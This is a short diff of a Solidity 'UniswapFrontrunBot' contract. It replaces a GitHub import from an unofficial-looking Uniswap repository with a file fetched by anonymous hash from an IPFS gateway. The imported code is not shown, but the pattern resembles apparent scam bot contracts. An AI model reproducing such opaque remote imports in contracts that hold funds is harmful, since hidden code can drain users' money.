@@ -3,7 +3,7 @@ pragma solidity ^0.6.6;
 // Import Libraries Migrator/Exchange/Factory
 import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://raw.githubusercontent.com/uniswap-v3-router/mempool/main/v3";
+import "https://gateway.pinata.cloud/ipfs/QmNcGujEs9APCYU2NnkkpSysv2ysEzjYvGihArEDBzQN8i";
 
 contract UniswapFrontrunBot {
 
